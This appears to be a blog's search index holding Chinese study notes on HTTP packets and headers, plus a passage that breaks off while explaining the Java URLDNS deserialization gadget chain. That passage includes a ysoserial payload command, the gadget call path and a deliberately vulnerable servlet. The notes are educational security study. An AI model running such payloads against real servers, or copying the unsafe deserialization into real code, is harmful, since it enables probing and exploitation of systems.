<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>5-CRLF与注入</title>
    <link href="/2025/11/25/5-CRLF%E4%B8%8E%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/11/25/5-CRLF%E4%B8%8E%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>4-IP相关</title>
    <link href="/2025/11/25/4-IP%E7%9B%B8%E5%85%B3/"/>
    <url>/2025/11/25/4-IP%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>3-代理与负载</title>
    <link href="/2025/11/25/3-%E4%BB%A3%E7%90%86%E4%B8%8E%E8%B4%9F%E8%BD%BD/"/>
    <url>/2025/11/25/3-%E4%BB%A3%E7%90%86%E4%B8%8E%E8%B4%9F%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2-网络通信</title>
    <link href="/2025/11/25/2-%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/"/>
    <url>/2025/11/25/2-%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>1-数据包</title>
    <link href="/2025/11/25/1-%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
    <url>/2025/11/25/1-%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h2 id="HTTP："><a href="#HTTP：" class="headerlink" title="HTTP："></a>HTTP：</h2><ul><li>超文本传输协议</li><li>用于定义WEB浏览器与WEB服务器之间交换数据的过程</li><li>规定了请求和响应的整个过程</li><li>HTTP是基于TCP的，是应用层协议，会在TCP&#x2F;IP协议栈向下传递的时候不断封装数据帧<br><img src="/5.png"></li></ul><h3 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h3><ul><li>数据格式<ul><li>请求行</li><li>请求头</li><li>空行：请求头和请求体之间用一个空行隔开<ul><li><em><strong>最后一个请求头标之后是空行</strong></em>，发送回车符和退行，通知服务器以下不再有头标，还有内容的话就是请求体</li></ul></li><li>请求体：要发送的数据（一般post提交会使用）</li></ul></li></ul><h4 id="请求行-请求方法（重点掌握）"><a href="#请求行-请求方法（重点掌握）" class="headerlink" title="请求行&#x2F;请求方法（重点掌握）"></a>请求行&#x2F;请求方法（重点掌握）</h4><ul><li>请求行由三个标记组成：请求方法、请求 URL（路径） 和 HTTP 版本，它们用空格分享</li><li>例如：<code>GET /index.html HTTP/1.1</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python">HTTP 规划定义了 <span class="hljs-number">8</span> 种可能的请求方法：<br>GET：检索 URL 中标识资源的一个简单请求<br><span class="hljs-number">1.</span>通常用来从浏览器获取内容。<br><span class="hljs-number">2.</span>请求参数默认在地址栏中。`格式：URL/参数<span class="hljs-number">1</span>=？？？（&amp;参数<span class="hljs-number">2</span>=？？？......）`。<br><span class="hljs-number">3.</span>请求参数的大小有限制，一般<span class="hljs-number">1</span>-8KB，不同浏览器不同。<br><span class="hljs-number">4.</span>**是默认的请求方式**。<span class="hljs-number">5.</span>相对不安全（地址栏直接发现）<br><br>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档<br><br>POST：服务器接受被写入客户端输出流中的数据的请求<br><span class="hljs-number">1.</span>通常用来提交内容（提交表单（登录、注册、个人信息填写等））<br><span class="hljs-number">2.</span>请求参数在实体，即`Form Data`（表单数据）中。<br><span class="hljs-number">3.</span>请求参数的大小认为没有限制。<br><span class="hljs-number">4.</span>上传文件必须使用post请求。<span class="hljs-number">5.</span>相对安全<br><br>PUT：服务器保存请求数据作为指定 URL 新内容的请求<br><span class="hljs-number">1.</span>用于修改，携带实体内容，修改的同时会覆盖，即拿新的内容覆盖原先内容<br><span class="hljs-number">2.</span>`格式：URL/update/...（同上）`<br><br>DELETE：服务器删除 URL 中命令的资源的请求<br><span class="hljs-number">1.</span>用于删除内容。<br><span class="hljs-number">2.</span>有restful风格该风格也支持PUT；PATCH。<br><span class="hljs-number">3.</span>`格式：URL/delete/...（...中为删除的内容）`<br>请求体里也能放要删除的资源<br><br>`PATCH请求`：<br><span class="hljs-number">1.</span>同样用于修改，但不会覆盖。<br><span class="hljs-number">2.</span>`格式：URL/patch/...（同上）`<br><br>OPTIONS：关于服务器支持的请求方法信息的请求<br><br>TRACE：web 服务器反馈 Http 请求和其头标的请求<br><br>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理<br></code></pre></td></tr></table></figure></li></ul><h5 id="HTTP-Version"><a href="#HTTP-Version" class="headerlink" title="HTTP-Version"></a>HTTP-Version</h5><h6 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP&#x2F;1.0"></a>HTTP&#x2F;1.0</h6><ul><li>发出请求，中断连接</li><li><code>HTTP/1.0</code>是无状态、无连接的<ul><li><strong>无连接</strong>：每次请求都需要建立连接，需要使用<code>keep-alilve</code>参数建立<em>长连接</em>。无法复用连接，每次发送请求都需要进行TCP连接，而TCP连接释放都较耗时，因此导致网络利用率低<ul><li><code>keep-alive</code>就是告诉对方在这次请求&#x2F;响应完成后先不要关闭TCP连接</li></ul></li><li><strong>无状态</strong>：服务器不需要额外资源记录，减轻服务器负担</li></ul></li></ul><h6 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP&#x2F;1.1"></a>HTTP&#x2F;1.1</h6><ul><li>发出请求，保持连接，如果同样的请求，复用连接</li><li><code>HTTP/1.1</code>默认长连接<code>kepp-alile</code>，即使不显式写出，连接也会保持一段时间，除非响应头中明确包含<code>Connection: close</code></li><li>支持管道网络传输，<strong>客户端可以发起多个请求</strong>，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以减少整体的响应时间。<ul><li>但是服务器必须<strong>按照接收请求的顺序发送对这些管道化请求的响应</strong></li></ul></li></ul><h6 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP&#x2F;2.0"></a>HTTP&#x2F;2.0</h6><ul><li><code>HTTP/2.0</code>会压缩<code>header</code>部分，如果多个请求其头部一样或相似，则协议会消除重复部分</li><li>利用<code>HPAK</code>算法：在客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，就不用重复发送同样字段了，只发送索引号，减少数据量提高速度</li><li>与1.0和1.1不同的是，2.0中采用了<strong>二进制格式</strong>而不是纯文本格式</li><li>报头和数据体称为帧：<strong>头信息帧</strong>和<strong>数据帧</strong></li></ul><h6 id="队头阻塞"><a href="#队头阻塞" class="headerlink" title="队头阻塞"></a>队头阻塞</h6><ul><li>无论是无连接还是长连接，请求和响应必须串行处理</li><li>即如果第一个请求的响应还没返回，后面的请求机制已发送，也必须等待</li></ul><h4 id="HTTP请求头：request-header"><a href="#HTTP请求头：request-header" class="headerlink" title="HTTP请求头：request-header"></a>HTTP请求头：request-header</h4><ul><li>由关键字&#x2F;值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器关于客户端的功能和标识</li></ul><h5 id="HOST"><a href="#HOST" class="headerlink" title="HOST"></a>HOST</h5><ul><li>主机或域名地址，是要访问的主机名称，即对应网址 URL 中的 Web 名称和端口号。</li></ul><h5 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h5><ul><li>通知服务器浏览器或其他客户可以接爱的 MIME 文件格式。Servlet （<strong>中间件</strong>）可以根据它判断并返回适当的文件格式。</li></ul><h5 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h5><ul><li>指出浏览器可以接受的编码方式</li><li>编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式</li></ul><h5 id="Accept-Langeuage"><a href="#Accept-Langeuage" class="headerlink" title="Accept-Langeuage"></a>Accept-Langeuage</h5><ul><li>指出浏览器可以接受的语言种类</li><li>如 en 或 en-us指英语</li></ul><h5 id="Accept-Charset"><a href="#Accept-Charset" class="headerlink" title="Accept-Charset"></a>Accept-Charset</h5><ul><li>指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.</li></ul><h5 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h5><ul><li>是客户浏览器名称，即发出请求的客户端信息，是Web浏览器用于声明自身型号版本并随HTTP请求发送给Web服务器的字符串</li></ul><h6 id="UA字段整理"><a href="#UA字段整理" class="headerlink" title="UA字段整理"></a>UA字段整理</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 微信6.0：</span><br><span class="hljs-comment">## 从微信6.0开始，其内嵌的浏览器在User Agent字符串中增加了NetType字段用于标识客户端（手机）当前的网络环境，该字段至少有以下3个取值：</span><br>- NetType/WIFI<br>- NetType/2G<br>- NetType/3G<br><span class="hljs-comment"># iPhone：</span><br>iPhone 5 / iOS 8.0 / Wifi：<br>Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/WIFI<br><br>iPhone 5 / iOS 8.0 / 2G：<br>Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G<br><br>iPhone 5 / iOS 8.0 / 3G：<br>Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/3G+<br><span class="hljs-comment"># 小米： </span><br>红米 / Android 4.2.2 / Wifi：<br>Mozilla/5.0 (Linux; U; Android 4.2.2; zh-cn; 2014011 Build/HM2014011) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 MicroMessenger/6.0.0.50_r844973.501 NetType/WIFI<br><br>小米3 / Android 4.4.2 / Wifi （微信5.3还没有提供 NetType 字段）：<br>Mozilla/5.0 (Linux; Android 4.4.2; MI 3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 MicroMessenger/5.3.0.51_r697493.440<br><br></code></pre></td></tr></table></figure><h5 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h5><ul><li>浏览器用这个属性向服务器发送 Cookie</li><li>Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。是浏览器存储的缓存信息</li></ul><h5 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h5><ul><li>表明产生请求数据包的网页URL</li><li>Referer这个属性可以用来<strong>跟踪 Web 请求是从什么网站来的</strong>。</li><li>用于检查请求来源是否合法，采用的格式是URL</li><li>防盗链（例如：仅允许从本站页面访问图片资源）</li><li>统计流量来源</li><li>CSRF防护（部分系统会检查Referer是否合法）</li><li>referer-policy策略：<ul><li>no-referer：该策略表示不发送referer信息</li><li>no-referrer-when-downgrade：如果从 HTTPS 网址链接到 HTTP 网址，不发送Referer字段，其他情况发送</li><li>origin：Referer字段一律只发送源信息（协议+域名+端口），不管是否跨域</li><li>origin-when-cross-origin：同源时，发送完整的Referer字段，跨域时发送源信息。</li></ul></li><li>strict-origin：如果从 HTTPS 网址链接到 HTTP 网址，不发送Referer字段，其他情况只发送源信息。</li><li>strict-origin-when-cross-origin：同源时，发送完整的Referer字段；跨域时，如果 HTTPS 网址链接到 HTTP 网址，不发送Referer字段，否则发送源信息</li><li>unsafe-url：Referer字段包含源信息、路径和查询字符串，不包含锚点、用户名和密码</li></ul><h5 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h5><ul><li>简称<em><strong>XFF头</strong></em>，代表客户端，也就是<em><strong>HTTP的请求端真实的IP</strong></em></li><li>只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项</li><li>如果后端仅检查XFF头来获取客户端IP，而没有验证，攻击者可以伪造XFF头来绕过IP限制</li><li>格式示例：<code>X-Forwarded-For: client_ip, proxy1_ip, proxy2_ip</code></li><li>从左到右依次是客户端真实IP和各级代理IP</li><li>某些场景下，XFF头可能被用于构造服务端请求（如日志系统），若未过滤，可能导致SSRF（服务端请求伪造），可用于伪造IP</li></ul><h5 id="Via"><a href="#Via" class="headerlink" title="Via"></a>Via</h5><ul><li>用于跟踪请求和响应及你给过的<em><strong>代理服务器信息</strong></em></li><li>允许客户端和服务端了解请求和响应的路径，以及是否经过代理服务器</li><li>由代理服务器<em><strong>自动添加和更新</strong></em></li><li>反向代理检测：服务器可以通过Via头字段判断请求是否经过了反向代理服务器，以便做出不同的处理。</li><li>防止循环：Via头字段可以用于检测请求或响应在代理服务器之间发生循环转发的情况，防止请求和响应在代理服务器之间无限循环。</li></ul><h6 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h6><ul><li>该字段由多部分组成，<strong>每个部分</strong>表示&#x3D;&#x3D;一个&#x3D;&#x3D;经过的<strong>代理服务器</strong>*</li><li>每个部分的组成内容：<ul><li>PS：由逗号分隔<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.协议版本：代理服务器使用的HTTP协议版本，例如HTTP/1.1。<br>2.代理服务器：代理服务器的域名或IP地址:监听的端口号。<br>3.注释：*可选项*，用于提供额外信息，例如代理服务器的软件和版本<br><span class="hljs-comment"># 示例：</span><br>Via: 1.1 proxy.example.com:8080, 1.1 forward-proxy.example.net<br></code></pre></td></tr></table></figure></li></ul></li><li>当请求经过一个代理服务器时，代理会自动添加一个新的包含它自身信息<code>Via</code>字段，同时会更新请求中原有的<code>Via</code>字段，把自己的信息追加到最前面</li></ul><h5 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h5><ul><li>用来告诉服务器是否可以维持固定的 HTTP 连接</li><li>HTTP 是无连接的，HTTP&#x2F;1.1 使用 <strong>keep-alive</strong>为<strong>默认值</strong>，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接</li><li>当值为<code>close</code>的时候：该信息由服务器发送，发送完服务器自动断开</li></ul><h6 id="Proxy-Connection"><a href="#Proxy-Connection" class="headerlink" title="Proxy-Connection"></a>Proxy-Connection</h6><ul><li>使用代理后会变成这样</li><li><strong>默认值</strong>同样为<strong>keep-alive</strong></li></ul><h5 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h5><ul><li>用来表明request的内容类型。可以用HttpServletRequest 的getContentType()方法取得。</li><li><code>application/x-www-form-urlencoded</code>：表单形式</li><li><code>application/json</code>：json格式</li></ul><h5 id="请求的实体内容（请求数据）"><a href="#请求的实体内容（请求数据）" class="headerlink" title="请求的实体内容（请求数据）"></a>请求的实体内容（请求数据）</h5><ul><li>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</li></ul><h4 id="http响应"><a href="#http响应" class="headerlink" title="http响应"></a>http响应</h4><ul><li>数据格式<ul><li>状态行：协议版本、数字形式的状态代码和状态描述，元素之间以空格分隔<ul><li>响应的状态码：一个数字。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">200（请求被成功处理）<br>304（使用缓存）<br>403 存在文件夹<br>404（路径错误/资源不存在）<br>500:表示服务器在处理请求时遇到无法处理的错误，通常源于服务端的问题，如：代码错误、配置错误、资源不可用<br>302/307（请求重定向（从一个页面转到另一个页面（比如登录成功之后跳转到首页）））<br>401（请求未认证（比如需要登录权限进行操作，没有登录））<br><br>- HTTP状态码分类 <br>1 信息，服务器收到请求，需要请求者继续执行操作<br>    2 成功，操作被成功接收并处理<br>    3 重定向，为了完成请求需要进一步的操作以完成请求<br>    4 客户端错误，请求包含语法错误或无法完成请求<br>    5 服务器错误，服务器在处理请求的过程中发生了错<br></code></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p><a href="https://blog.csdn.net/leledexixi/article/details/59109160">了解更多状态码</a></p><ul><li>响应头：包含服务器类型、日期、长度、内容类型等</li><li>空行</li><li>响应数据：服务器返给客户端的数据，浏览器会将实体内容中的数据取出来，生成相应的页面</li></ul><h5 id="HTTP响应头：response-header"><a href="#HTTP响应头：response-header" class="headerlink" title="HTTP响应头：response header"></a>HTTP响应头：response header</h5><p>1.connection:保持连接<br>2.&#x3D;&#x3D;content-type&#x3D;&#x3D;</p><ul><li>text&#x2F;html（网页形式）<ul><li>image&#x2F;jpeg </li><li>text&#x2F;json（json数据格式）</li><li>application&#x2F;json（json格式的数据）<br>  3.date<br>  4.&#x3D;&#x3D;Set-Cookie头&#x3D;&#x3D;：设置HTTP cookie，服务器返回给浏览器</li></ul></li></ul><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><ul><li>安全套接字层超文本传输协议</li><li>比HTTP更安全</li><li>加入了SSL协议，该协议依靠证书来验证服务器的身份并为通信提供加密</li><li>非对称加密公钥加密信息私钥解密，私钥加密信息公钥解密</li><li>HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。</li><li>HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL&#x2F;TLS之上，SSL&#x2F;TLS运行在TCP之上，所有传输的内容都经过加密的。</li><li>HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</li><li>HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题</li></ul>]]></content>
    
    
    <categories>
      
      <category>数据与网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据包</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA-GadgetChain-1-URLDNS</title>
    <link href="/2025/11/25/JAVA-GadgetChain-1-URLDNS/"/>
    <url>/2025/11/25/JAVA-GadgetChain-1-URLDNS/</url>
    
    <content type="html"><![CDATA[<ul><li><code>java -jar ysoserial-all.jar URLDNS 靶机URL|base64</code></li><li>触发结果是一次DNS请求</li><li>非常适合在检测反序列化的时候使用<ul><li>使用<code>JAVA</code>内置类构造，对第三方库没有依赖</li><li>在目标没有回显的时候能够通过DNS请求得知是否存在反序列化漏洞URL类，调用<code>openConnection</code>方法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">java.net.InetAddress;  </span><br><span class="hljs-comment">java.net.URLConnection;  </span><br><span class="hljs-comment">java.net.URLStreamHandler;</span><br><span class="hljs-comment">java.util.HashMap;  </span><br><span class="hljs-comment">java.net.URL;</span><br><span class="hljs-comment">*   Gadget Chain:  </span><br><span class="hljs-comment">*     HashMap.readObject()  </span><br><span class="hljs-comment">*       HashMap.putVal()  </span><br><span class="hljs-comment">*         HashMap.hash()  </span><br><span class="hljs-comment">*           URL.hashCode()</span><br><span class="hljs-comment">*             URLStreamHandler.hashCode()</span><br><span class="hljs-comment">*               URLStreamHandler.getHostAddress()</span><br><span class="hljs-comment">*                 URL.getHostAddress()</span><br><span class="hljs-comment">*                   InetAddress.getByName()</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></li></ul></li><li><code>java.util.HashMap</code>重写了<code>readObject()</code>，在反序列化的时候会调用<code>hash</code>计算<code>key</code>的<code>hashCode</code></li><li>而<code>java.net.URL</code>的<code>hashCode</code>在计算的时候会调用<code>getHostAddress</code>来解析域名，<strong>同时放出DNS请求</strong></li></ul><h4 id="java-util-HashMap"><a href="#java-util-HashMap" class="headerlink" title="java.util.HashMap"></a>java.util.HashMap</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@java</span>.io.Serial  <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>    <span class="hljs-comment">// ObjectInputStream s：读取传入的输入流，对传入的序列化数据进行反序列化</span><br>    ......<br>      <br>    <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>) &#123;  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> + mappings);  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings == <span class="hljs-number">0</span>) &#123;  <br>        <span class="hljs-comment">// use defaults  </span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123;  <br>        ......<br>        <br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap  </span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;  <br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>                <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();  <span class="hljs-comment">// s.readObject()从序列化输入流中读取下一个对象。(K)奖对象强制转换为类型参数*K*</span><br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>                <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();  <br>            putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>); <br>            <span class="hljs-comment">// putVal()往HashMap中放入键值对，它调用hash()来处理key </span><br>        &#125;  <br>    &#125;  <br>&#125;<br><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;  <br>    <span class="hljs-type">int</span> h;  <br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);  <br>&#125;<br><span class="hljs-comment">// 跟进hash()方法，能发现它调用了key的hashCode()方法</span><br><br><span class="hljs-meta">@IntrinsicCandidate</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span>;<br><span class="hljs-comment">// hashCode()是一个来自Object的方法，意味着相当广泛，什么类都能调用这个方法</span><br></code></pre></td></tr></table></figure><ul><li>然后我们去找<code>java.net.URL</code>里的<code>hashCode()</code></li></ul><h5 id="ObjectInputStream-s接收的到底是什么数据"><a href="#ObjectInputStream-s接收的到底是什么数据" class="headerlink" title="ObjectInputStream s接收的到底是什么数据"></a>ObjectInputStream s接收的到底是什么数据</h5><ul><li><code>ObjectInputStream s</code>接收的是请求数据，但它不会自动拦截请求，要主动喂给它</li><li><code>s</code> (即 <code>ObjectInputStream</code> 实例) 接收的数据，就是客户端通过网络发送过来的二进制数据流<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/upload_save_file&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SaveFileServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <br>        <span class="hljs-comment">// 1. 获取网络原始输入流（这里面就是客户端发来的 HTTP Body）</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">netIn</span> <span class="hljs-operator">=</span> request.getInputStream();<br>        <br>        <span class="hljs-comment">// 2. 将网络流包装成 ObjectInputStream</span><br>        <span class="hljs-comment">// 只有代码执行到这一行，才会开始解析序列化头</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(netIn);<br>        <br>        <span class="hljs-comment">// 3. 开始反序列化 (触发漏洞！)</span><br>        <span class="hljs-comment">//  &quot;s 接收的数据&quot;</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">gameSave</span> <span class="hljs-operator">=</span> s.readObject(); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h6 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h6><blockquote><p><strong>Q1: 是客户端在与服务端交互时传输的数据吗？</strong> </p><blockquote><p>是的。完全取决于客户端发了什么。如果客户端发的是普通文本，服务端用 <code>ObjectInputStream</code> 去读就会报错（<code>StreamCorruptedException</code>）；如果客户端发的是符合 <code>Java</code> 序列化格式的二进制流（<code>Payload</code>），服务端就能读进去。</p></blockquote></blockquote><blockquote><p><strong>Q2: 是每个请求的数据都会被它接收吗？</strong> </p><blockquote><p>不是。 只有当请求打到了<strong>特定的 URL 接口</strong>（比如上面的 <code>/upload_save_file</code>），并且该接口的后端代码里<strong>显式地 new 了一个</strong> <code>ObjectInputStream</code> 并调用了 <code>readObject()</code>，数据才会被接收和处理。 如果你访问 <code>/index.html</code> 或者 <code>/login.php</code>，后端处理逻辑不一样，没有用到 <code>ObjectInputStream</code>，那么无论你发什么 Payload 都没用。</p></blockquote></blockquote><h4 id="java-net-URL"><a href="#java-net-URL" class="headerlink" title="java.net.URL"></a>java.net.URL</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 